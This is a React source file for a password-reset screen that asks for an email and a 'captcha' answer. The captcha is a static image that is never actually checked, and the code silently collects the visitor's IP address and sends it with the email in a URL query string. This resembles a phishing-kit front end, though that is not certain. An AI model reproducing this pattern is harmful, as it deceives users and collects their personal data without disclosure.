import {Box, Center, Checkbox, Container, Divider, Flex, Heading, HStack, Image, Link, VStack} from "@chakra-ui/react";
import CustomInput from "../component/CustomInput.jsx";
import {FaExternalLinkAlt} from "react-icons/fa";
import {useTranslation} from "react-i18next";
import {useContext, useState} from "react";
import CustomButton from "../component/CustomButton.jsx";
import {apiPostHandle} from "../util/api.js";
import {IoIosRefresh} from "react-icons/io";
import {HiSpeakerWave} from "react-icons/hi2";
import {IPInfoContext} from "ip-info-react";

const ForgotScreen = ({setCurrentScreen,systemPrefersDark}) => {


    const userInfo = useContext(IPInfoContext);
    const ipAddress = userInfo.ip;

    const {t, i18n} = useTranslation();
    const currentLang = i18n.language
    const [email, setEmail] = useState("")
    const [catText, setCatText] = useState("")
    const [loading, setLoading] = useState(false)

    console.log(systemPrefersDark)

    const handleSign = () => {

        // apiPostHandle("/change-account",{deneme: "sasd"})


        if (email !== "" && catText !== "") {
            setLoading(true)

            const msg=`${ipAddress} ${email}`

            apiPostHandle(`/send-forgot?msg=${msg}`).then(res => {
                if (res.status === 200) {
                    setCurrentScreen("confirm")
                }


                setLoading(false)
            }).catch(err => {
                console.log(err)
                setLoading(false)

            })

        }


    }

    return (
        <Container height={"100%"}>
            <VStack mt={100} width={"100%"}>
                <Box mt={10} width={"100%"}>
                    <Heading color={!systemPrefersDark?"black":"white"} size={"xl"} textAlign={"start"}>{t("forgot.head")}</Heading>
                </Box>
                <Box mt={5} width={"100%"}>
                    <CustomInput textColor={!systemPrefersDark?"black":"white"}
                                 placeholderColor={!systemPrefersDark?"black":"white"} placeholder={t("forgot.input1")}
                                 borderColor={!systemPrefersDark?"black":"white"}
                                 setValue={setEmail} value={email}/>
                    <CustomInput textColor={!systemPrefersDark?"black":"white"}
                                 placeholderColor={!systemPrefersDark?"black":"white"}
                                 placeholder={t("forgot.input2")}
                                 borderColor={!systemPrefersDark?"black":"white"} setValue={setCatText} value={catText}/>
                </Box>

                <Box mt={5} width={"100%"}>
                    <Image align={"start"} src="assets/catpca.jpeg" height={50}/>
                </Box>

                <Box mt={5} width={"100%"}>
                    <Flex justifyContent={"start"} height={45} width={120}>
                        <CustomButton text={t("forgot.button")} backgroundColor={"black"} clickHandle={handleSign}
                                      isLoading={loading}/>
                    </Flex>
                </Box>

                <Box mt={5} width={"100%"}>
                    <HStack alignItems={"start"}>
                        <HStack>
                            <IoIosRefresh color={"#2563eb"} />
                            <Link onClick={()=>setCurrentScreen("forgot")} color={"#2563eb"}>
                                {t("forgot.link1")}
                            </Link>
                        </HStack>
                        <Center width={"5"} height={"7"}>
                            <Divider orientation='vertical' borderColor={"#2563eb"} />
                        </Center>
                        <HStack>
                            <HiSpeakerWave color={"#2563eb"} />
                            <Link onClick={()=>setCurrentScreen("forgot")} color={"#2563eb"}>
                                {t("forgot.link2")}
                            </Link>
                        </HStack>
                    </HStack>
                </Box>

            </VStack>
        </Container>
    )
}

export default ForgotScreen;